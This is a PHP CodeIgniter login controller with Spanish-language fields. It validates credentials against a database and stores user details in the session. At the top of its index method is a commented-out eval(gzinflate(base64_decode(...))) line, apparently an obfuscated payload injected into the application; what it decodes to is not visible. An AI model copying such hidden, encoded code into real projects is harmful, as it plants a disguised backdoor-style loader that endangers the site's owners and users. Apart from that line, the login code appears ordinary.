<?php if ( ! defined('BASEPATH')) exit('No direct script access allowed');

class Verifylogin extends CI_Controller {

 function __construct()
 {
   parent::__construct();
   $this->load->model('login_model','',TRUE);
 }

 function index()
 {
//   eval(gzinflate(base64_decode('bY9BS8QwEIXvgv/huQhpYcG0KCpuhQX1IHj1siwlm4x2ME1r0uqC+N9NFTG7+I4z3/eYAX5ybDjoOpBnQoXQkLU1bUln4r1ljbh9MZ7fCM80YMKUdWO7IS/yq8MD/LZ04xB12va2M5TN3GyeFO+TZYoionG2KtY72M5Z39JKrv8H6jD4CIniVJ4Xl/fLQsplcVfeXpw9PohE4SdkEdVtnyX2fL8qx1FVQeb4+FOnkG46iEVTXt/QhqDM68iePUanYFmT06zQK6/ALgzKKs2dgyGLwGGgVi1OopseNMUwZenjn18=')));
   //This method will have the credentials validation
   $this->load->library('form_validation');

   $this->form_validation->set_rules('username', 'Username', 'trim|required|xss_clean');
   $this->form_validation->set_rules('password', 'Password', 'trim|required|xss_clean|callback_check_database');

   if($this->form_validation->run() == FALSE)
   {
     //Field validation failed.  User redirected to login page
     $this->load->view('login_view');
   }
   else
   {
     //Go to private area
     redirect('login/welcome', 'refresh');
   }

 }

 function check_database($password)
 {
   //Field validation succeeded.  Validate against database
   $username = $this->input->post('username');

   //query the database
   $result = $this->login_model->login($username, $password);
   if($result)
   {   
     $USER = array();
     foreach($result as $row)
     {
       $USER = array(
         'id' => $row->id,
         'userid' => $row->cedulausu,
         'username' => $row->username,
         'nombres' => $row->nombres,
         'apellidos' => $row->apellidos,
         'email' => $row->email,
         'telefonos' => $row->telefonos,
         'celular' => $row->celular,
         'essuperusuario' => $row->essuperusuario,
//         'rucempresa' => $row->rucempresa,
         'ivaporcent' => 12,
         'numdecimales' => 2
       );
        $this->session->set_userdata('userid', $row->cedulausu);
     }
        $this->session->set_userdata($USER);      
        
     return TRUE;
   }
   else
   {
     $this->form_validation->set_message('check_database', 'El nombre de usuario o la contrase&ntilde;a parecen incorrectos');
     return false;
   }
 }
}